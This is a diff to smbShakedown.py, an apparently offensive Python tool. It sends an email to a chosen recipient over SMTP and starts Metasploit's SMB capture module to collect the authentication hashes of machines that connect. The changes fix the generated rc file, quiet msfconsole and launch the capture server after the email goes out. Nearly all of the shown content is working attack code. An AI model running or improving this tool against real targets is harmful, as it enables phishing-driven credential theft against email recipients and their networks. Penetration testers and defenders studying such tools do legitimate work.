@@ -3,6 +3,7 @@
 # Created by: Nick Sanzotta / @beamr
 # Version: smbShakedown.py v 1.0
 import os, smtplib, getpass, readline, socket, time
+rcfile = 'smbServ.rc'
 
 def get_ip_address():
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -10,20 +11,19 @@ def get_ip_address():
 	return s.getsockname()[0]
 
 def smbServ():
-	smbServOption = raw_input("Launch Metasploit's SMB Capture module?[yes]:") or 'yes'
+	smbServOption = raw_input("\nLaunch Metasploit's SMB Capture module?[yes]:") or 'yes'
 	choice = smbServOption.lower()
 	yes = set(['yes','y', 'ye', ''])
 	no = set(['no','n'])
 	print('ENTERED: "%s"' % choice + "\n")
 	if choice in yes:
-		with open(filename, 'w') as f1:
+		with open(rcfile, 'w') as f1:
 			f1.write("use auxiliary/server/capture/smb"+"\n"+\
-				"set srvhost"+get_ip_address()+"\n"+\
+				"set srvhost "+get_ip_address()+"\n"+\
 				"exploit -j -z")
-			os.system('msfconsole -r smbServ.rc')
-			# sys.exit(2)
+		os.system('msfconsole -q -r smbServ.rc')
 	elif choice in no:
-		print("Ok, remember to setup your SMBCapture Server elsewhere.")
+		print("Ok, remember to setup your SMBCapture Server elsewhere. \n")
 
 	else:
 		sys.stdout.write("Please respond with 'yes' or 'no'")
@@ -66,16 +66,11 @@ def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAd
 
 def main():
 	ipAddress = get_ip_address()
-	smbServ()
 	# Currently this feature is not fully implemented
 	# serverOption = raw_input('Use Smarthost or localhost SMTP Server?[smarthost/localhost]: ') or 'smarthost'
 	# choice = serverOption.lower()
 	# smarthost = set(['smarthost','smart', 's', ''])
 	# localhost = set(['localhost','local', 'l'])
-
-
-
-
 	smtpServerAddress = raw_input('Enter SMTP Server address[smtp.gmail.com]: ') or 'smtp.gmail.com'
 	print('ENTERED: "%s"' % smtpServerAddress + "\n")
 	smtpServerPort = raw_input('Enter your SMTP Server Port[587]: ') or 587
@@ -115,6 +110,7 @@ Subject: smbShakedown.py test.
 	time.sleep(1)
 	print(emailMessage)
 	smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipientAddress, emailMessage)
-
+	time.sleep(1)
+	smbServ()
 if __name__ == "__main__":
 	main()
